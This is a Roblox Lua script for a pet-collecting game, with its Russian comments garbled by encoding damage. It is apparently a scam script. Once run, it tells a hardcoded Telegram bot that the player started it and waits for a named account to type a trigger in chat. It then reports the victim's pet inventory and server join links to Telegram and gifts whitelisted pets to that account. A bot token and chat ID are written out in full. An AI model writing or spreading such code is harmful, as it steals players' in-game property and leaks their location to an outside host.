local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- üîß –ù–ê–°–¢–†–û–ô–ö–ò
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "Rikizigg"
local TRIGGER_MESSAGE = "."
local DELAY = 2 -- –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–µ—Ä–µ–¥–∞—á–∞–º–∏

-- üêæ –ë–ï–õ–´–ô –°–ü–ò–°–û–ö (–¢–û–õ–¨–ö–û —ç—Ç–∏ –ø–∏—Ç–æ–º—Ü—ã –±—É–¥—É—Ç –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å—Å—è)
local WHITELIST = {
    "Hamster"
}

-- üåê –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ä–∞–±–æ—á–∏—Ö —Å—Å—ã–ª–æ–∫
local function getServerLinks()
    return {
        direct = string.format("roblox://placeID=%d&gameInstanceID=%s", game.PlaceId, game.JobId),
        web = string.format("https://www.roblox.com/games/%d?gameInstanceId=%s", game.PlaceId, game.JobId),
        joinCmd = string.format("/join %s", game.JobId)
    }
end

-- üîé –ù–∞–π—Ç–∏ –í–°–ï–• –ø–∏—Ç–æ–º—Ü–µ–≤
local function getAllPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            -- –ò—â–µ–º —Ñ–æ—Ä–º–∞—Ç "[X.XX KG] [Age X]"
            local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
            if weight and age then
                -- –ë–µ—Ä–µ–º —á–∏—Å—Ç–æ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ (–ø–µ—Ä–≤–æ–µ —Å–ª–æ–≤–æ)
                local petName = item.Name:match("^%s*([^%[%]]+)") or item.Name
                petName = petName:gsub("%s+$", "")
                
                table.insert(pets, {
                    name = petName,
                    fullName = item.Name,
                    weight = tonumber(weight),
                    age = tonumber(age),
                    object = item,
                    isWhitelisted = table.find(WHITELIST, petName) ~= nil
                })
            end
        end
    end
    
    return pets
end

-- üìú –°—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ
local function createReport(pets)
    if #pets == 0 then return "‚ùå –ù–µ—Ç –ø–∏—Ç–æ–º—Ü–µ–≤ –≤ –∏–Ω–≤–µ–Ω—Ç–∞—Ä–µ" end
    
    local message = "üìã –í—Å–µ –ø–∏—Ç–æ–º—Ü—ã ("..#pets.."):\n"
    for _, pet in ipairs(pets) do
        message = message .. string.format(
            "%s %s [%.2f –∫–≥, Age %d]\n",
            pet.isWhitelisted and "‚úì" or "‚úó",
            pet.name,
            pet.weight,
            pet.age
        )
    end
    return message
end

-- ‚úã –í–∑—è—Ç—å –≤ —Ä—É–∫—É
local function equipPet(pet)
    if not pet then return false end
    if not player.Character then return false end
    
    local humanoid = player.Character:FindFirstChild("Humanoid")
    if not humanoid then return false end
    
    humanoid:EquipTool(pet)
    task.wait(1)
    return true
end

-- üì§ –ü–µ—Ä–µ–¥–∞—Ç—å –ø–∏—Ç–æ–º—Ü–∞ (–¢–û–õ–¨–ö–û –∏–∑ –±–µ–ª–æ–≥–æ —Å–ø–∏—Å–∫–∞)
local function transferPet(pet)
    if not pet.isWhitelisted then 
        print("‚ùå –ù–µ –≤ –±–µ–ª–æ–º —Å–ø–∏—Å–∫–µ:", pet.name)
        return false 
    end
    
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then
        print("‚ùå –¶–µ–ª–µ–≤–æ–π –∏–≥—Ä–æ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω")
        return false
    end
    
    local gifting = ReplicatedStorage:FindFirstChild("GameEvents"):FindFirstChild("PetGiftingService")
    if not gifting then
        print("‚ùå PetGiftingService –Ω–µ –Ω–∞–π–¥–µ–Ω")
        return false
    end
    
    local success, err = pcall(function()
        gifting:FireServer("GivePet", target)
    end)
    
    if not success then
        print("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏:", err)
    end
    
    return success
end

-- üì® –û—Ç–ø—Ä–∞–≤–∏—Ç—å –≤ Telegram
local function sendToTelegram(text)
    local url = string.format(
        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
        TELEGRAM_TOKEN,
        TELEGRAM_CHAT_ID,
        HttpService:UrlEncode(text)
    )
    
    pcall(function()
        game:HttpGet(url, true)
    end)
end

-- üöÄ –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
local function startTransfer()
    local links = getServerLinks()
    local pets = getAllPets()
    local report = string.format(
        "%s\n\nüîó –°–ø–æ—Å–æ–±—ã –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:\n"..
        "1. –ö–ª–∏–∫: %s\n"..
        "2. –í–µ–±: %s\n"..
        "3. –ö–æ–º–∞–Ω–¥–∞: %s",
        createReport(pets),
        links.direct,
        links.web,
        links.joinCmd
    )
    
    sendToTelegram(report)
    
    local transferred = 0
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            local status = "‚ö†Ô∏è –ù–µ –≤–∑—è–ª—Å—è –≤ —Ä—É–∫—É"
            
            if equipPet(pet.object) then
                status = transferPet(pet) and "‚úÖ –£—Å–ø–µ—à–Ω–æ" or "‚ùå –û—à–∏–±–∫–∞"
                if status == "‚úÖ –£—Å–ø–µ—à–Ω–æ" then
                    transferred = transferred + 1
                end
            end
            
            sendToTelegram(string.format("%s: %s", pet.name, status))
            task.wait(DELAY)
        end
    end
    
    sendToTelegram(string.format("üèÅ –ò—Ç–æ–≥–æ –ø–µ—Ä–µ–¥–∞–Ω–æ: %d/%d", transferred, #pets))
end

-- üëÇ –°–ª—É—à–∞—Ç–µ–ª—å —á–∞—Ç–∞
game.Players.PlayerChatted:Connect(function(_, speaker, message)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        startTransfer()
    end
end)

-- üèÅ –°—Ç–∞—Ä—Ç–æ–≤–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
sendToTelegram(
    "üîî "..player.Name.." –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª —Å–∫—Ä–∏–ø—Ç\n"..
    "–û–∂–∏–¥–∞—é –∫–æ–º–∞–Ω–¥—É '"..TRIGGER_MESSAGE.."' –æ—Ç "..TARGET_PLAYER.."\n"..
    "‚úì - –±—É–¥—É—Ç –ø–µ—Ä–µ–¥–∞–Ω—ã\n‚úó - –Ω–µ –∏–∑ –±–µ–ª–æ–≥–æ —Å–ø–∏—Å–∫–∞"
)

print("‚úÖ –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω. –û–∂–∏–¥–∞—é –∫–æ–º–∞–Ω–¥—É '"..TRIGGER_MESSAGE.."' –æ—Ç", TARGET_PLAYER)
